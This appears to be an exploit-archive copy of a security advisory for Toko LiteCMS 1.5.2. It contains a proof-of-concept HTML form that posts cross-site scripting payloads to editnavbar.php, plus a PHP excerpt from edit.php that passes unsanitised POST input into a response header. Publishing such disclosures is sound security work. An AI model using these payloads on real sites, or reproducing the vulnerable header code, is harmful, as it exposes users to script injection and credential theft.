@@ -1,0 +1,46 @@
+source: http://www.securityfocus.com/bid/49673/info
+
+Toko LiteCMS is prone to an HTTP-response-splitting vulnerability and multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user, steal cookie-based authentication credentials, and influence how web content is served, cached, or interpreted. This could aid in various attacks that try to entice client users into a false sense of trust.
+
+Toko LiteCMS 1.5.2 is vulnerable; other versions may also be affected. 
+
+Cross Site Scripting Vulnerabilities
+
+<html>
+<title>Toko Lite CMS 1.5.2 (EditNavBar.php) Multiple Parameters XSS POST Injection</title>
+<body bgcolor="#1C1C1C">
+<script type="text/javascript">
+function xss(){document.forms["xss"].submit();}
+</script>
+<br /><br />
+<form action="http://www.example.com/tokolite1.5.2/editnavbar.php" enctype="application/x-www-form-urlencoded" method="POST" id="xss">
+<input type="hidden" name="currPath" value=&#039;"><script>alert(1)</script>&#039; />
+<input type="hidden" name="path" value=&#039;"><script>alert(2)</script>&#039; />
+</form>
+<a href="javascript: xss();" style="text-decoration:none">
+<b><font color="red"><center><h3>Exploit!</h3></center></font></b></a><br /><br />
+</body></html>
+
+
+HTTP Response Splitting
+
+====================================================================
+/edit.php:
+--------------------------------------------------------------------
+
+ 3: $charSet = "iso-8859-1";
+ 4: $dir = "ltr";
+ 5:
+ 6: if ( isset( $_POST[ "charSet" ] ) )
+ 7: {
+ 8:     $charSet = $_POST[ "charSet" ];
+ 9:
+10:     if ( $charSet == "windows-1255" )
+11:     {
+12:        $dir = "rtl";
+13:     }
+14: }
+15:
+16: header( "Content-Type: text/html; charset=" . $charSet );
